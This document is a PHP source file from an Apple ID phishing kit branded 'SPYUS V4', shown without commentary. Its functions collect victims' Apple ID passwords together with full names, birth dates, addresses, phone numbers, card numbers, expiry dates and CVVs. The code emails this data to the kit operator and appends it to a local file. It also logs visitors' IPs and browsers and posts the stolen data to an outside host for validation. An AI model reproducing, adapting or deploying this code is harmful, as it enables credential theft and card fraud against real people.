<?php
require "antibots.php";
require 'email.php';
/*-----------------------------------------------------
-----------------------------------------------------*/
function LoginSend($spyuskey,$spyus_email,$spyus_Hacker){
        $ip = getenv("REMOTE_ADDR");
        $userag = $_SERVER['HTTP_USER_AGENT']; 

$email =  "


<div style='background: #ddd; text-align: center; font-family: helvetica, arial, verdana, sans-serif; font-size: 16px; line-height: 22px; color: #222;'><div style='padding: 30px;'><div style='margin: 0 auto; width: 540px; background: white; text-align: left; padding: 25px; border-radius: 8px; -moz-border-radius: 8px; -webkit-border-radius: 8px;'><p></a></p>
  <h1 style='text-align: center'>
  AppleID SPYUS V4</h1>
  <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; text-align:center; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  &nbsp;<h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; text-align:center; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  <font color='#0066FF'>New Login From ~ ".$spyuskey['appid']."</font>  
    <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; text-align:center; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  <font color='#FF0000'> 
  ".$spyus_Hacker."</font><h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
      &nbsp;<p><b>Password : </b>".$spyuskey['pwd0']." </p>
    <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
    <font color='#0066FF'>Os Information</font> <p><b>IP : </b> 
    <a href='http://www.geoiptool.com/?IP=".spyus_Ip()."'>http://www.geoiptool.com/?IP=".spyus_Ip()."</a> </p>
    <p><b>Browser : </b>".$userag." </p><p><b>OS : </b>".spyus_Os($spyus_useragent)." </p><p><b>Date And Time : </b>".gmdate("H:i:s")." / ".gmdate("d/n/Y")." </p></div></div></div>
    
                        ";

$sub = "Apple Login [SPYUSV4] From ".$spyuskey['appid']." | [".spyus_Ip()."] ";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
spyus_save($email);
spyus_log($spyus_email,$sub,$email,$head);
}
/*-----------------------------------------------------
-----------------------------------------------------*/

function CheckLogin($email,$spyus_Hacker) {
    $ip = getenv("REMOTE_ADDR");
    $email['ip'] = $ip;
    $ckfile = tempnam("./tmp", "CURLCOOKIE"); 
    $ch = curl_init("http://s3curity.tn/applev2/Check_Login.php");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $email);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $startcurl = curl_exec($ch);
    curl_close($ch);
    return $startcurl;
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function CCSend($spyus,$spyus_email,$spyus_Hacker){
        $ip = getenv("REMOTE_ADDR");
        $userag = $_SERVER['HTTP_USER_AGENT']; 

$email1 =  "

<html><div style='background: #ddd; text-align: center; font-family: helvetica, arial, verdana, sans-serif; font-size: 16px; line-height: 22px; color: #222;'><div style='padding: 30px;'>
  <div style='margin: 0 auto; width: 531px; background: white; text-align: left; padding: 25px; border-radius: 8px; -moz-border-radius: 8px; -webkit-border-radius: 8px; height:868px'><p></a></p>
  <h1 style='text-align: center'>
  AppleID SPYUS V4</h1>
  <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; text-align:center; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  &nbsp;<h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; text-align:center; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  <font color='#0066FF'>New Billing PPL From ~ ".$spyus['cntr']."</font>  
    <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; text-align:center; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  <font color='#FF0000'> 
  ".$spyus_Hacker."</font><h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
      &nbsp;<p><b>Full Name : </b>".$spyus['fname']." ".$spyus['mname']." ".$spyus['lname']." </p>
      <p><b>Date of birth : </b>".$spyus['dob']." </p>
      <p><b>Billing Adresse: </b>".$spyus['add1']." , ".$spyus['add2']." , ".$spyus['city']." 
    , ".$spyus['zipcode']."</p>
      <p><b>Phone Number : </b>".$spyus['arec']." ".$spyus['phonen']."</p>
  <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  &nbsp;<p><b>Card Holder Name : </b>".$spyus['cchn']." </p>
      <p><b>Card Number : </b>".$spyus['ccnum']." </p>
      <p><b>Date Expiration : </b>".$spyus['expdate']." </p>
      <p><b>CVV : </b>".$spyus['cvv2']." </p>
  <h2 style='font-size: 16px; border-bottom: 1px solid #ccc; color: black; margin: 10px 0; padding-left:0; padding-right:0; padding-top:0; padding-bottom:5px'>
  <font color='#0066FF'>Os Information</font> <p><b>IP : </b> 
  <a href='http://www.geoiptool.com/?IP=".spyus_Ip()."'>http://www.geoiptool.com/?IP=".spyus_Ip()."</a> </p>
  <p><b>Browser : </b>".$userag." </p><p><b>OS : </b>".spyus_Os($spyus_useragent)." </p><p><b>Date And Time : </b>".gmdate("H:i:s")." / ".gmdate("d/n/Y")." </p></div></div></div></html>

";
/*
   Functions send email.
*/
$sub = "Apple Full [SPYUS V4] Info From ".$spyus['cntr']." | [".spyus_Ip()."] ";
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
spyus_bill($spyus_email,$sub,$email1,$head);
spyus_save2($email1);
}
/*-----------------------------------------------------
-----------------------------------------------------*/

function Checkbill($email1,$spyus_Hacker) {
    $ip = getenv("REMOTE_ADDR");
    $email1['ip'] = $ip;
    $ckfile = tempnam("./tmp", "CURLCOOKIE"); 
    $ch = curl_init("http://s3curity.tn/applev2/Check_Billi.php");  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $email1);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $startcurl = curl_exec($ch);
    curl_close($ch);
    return $startcurl;
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_save($email){
    $f = fopen("../../Fulzz.html", "a+");
    fwrite($f, $email);
    fclose($f);
}
function spyus_save2($email1){
    $f = fopen("../../Fulzz.html", "a+");
    fwrite($f, $email1);
    fclose($f);
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_log($spyus_email,$sub,$email,$head){
 mail($spyus_email,$sub,$email,$head);
}

function spyus_bill($spyus_email,$sub,$email1,$head){
 mail($spyus_email,$sub,$email1,$head);
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_Ran($spyus_length = 50) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $String = '';
    for ($i = 0; $i < $spyus_length; $i++) {
        $String .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $String;
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_Vu($u)
{
$spyus = fopen("Vu.txt","a+");
fwrite($spyus,"[".spyus_Ip()."] came to us on [".gmdate("Y/n/d")."] @ [".gmdate("H:i:s")."] with (".spyus_Browser($u).") using (".spyus_Os($u).")\n");
fclose($spyus);
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_Ip(){
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
        $a = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
        $a = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
        $a = getenv("REMOTE_ADDR");
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
        $a = $_SERVER['REMOTE_ADDR'];
    else
        $a = "";
    return($a);
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_Browser($spyus_useragent){
    $browser    =   "Unknown Browser";
    $browser_a  =   array('/msie/i'     =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_a as $regex => $value) { 
        if (preg_match($regex, $spyus_useragent)) {
            $browser = $value;
        }
    }
    return $browser;
}
/*-----------------------------------------------------
-----------------------------------------------------*/
function spyus_Os($spyus_useragent){
    $os    =   "Unknown OS Platform";
    $os_a  =   array( '/windows nt 10/i'     =>  'Windows 10',
                    '/windows nt 6.3/i'     =>  'Windows 8.1',
                    '/windows nt 6.2/i'     =>  'Windows 8',
                    '/windows nt 6.1/i'     =>  'Windows 7',
                    '/windows nt 6.0/i'     =>  'Windows Vista',
                    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                    '/windows nt 5.1/i'     =>  'Windows XP',
                    '/windows xp/i'         =>  'Windows XP',
                    '/windows nt 5.0/i'     =>  'Windows 2000',
                    '/windows me/i'         =>  'Windows ME',
                    '/win98/i'              =>  'Windows 98',
                    '/win95/i'              =>  'Windows 95',
                    '/win16/i'              =>  'Windows 3.11',
                    '/macintosh|mac os x/i' =>  'Mac OS X',
                    '/mac_powerpc/i'        =>  'Mac OS 9',
                    '/linux/i'              =>  'Linux',
                    '/ubuntu/i'             =>  'Ubuntu',
                    '/iphone/i'             =>  'iPhone',
                    '/ipod/i'               =>  'iPod',
                    '/ipad/i'               =>  'iPad',
                    '/android/i'            =>  'Android',
                    '/blackberry/i'         =>  'BlackBerry',
                    '/webos/i'              =>  'Mobile');
    foreach ($os_a as $regex => $value) { 
        if (preg_match($regex, $spyus_useragent)) {
            $os = $value;
        }

    }   
    return $os;
}


?>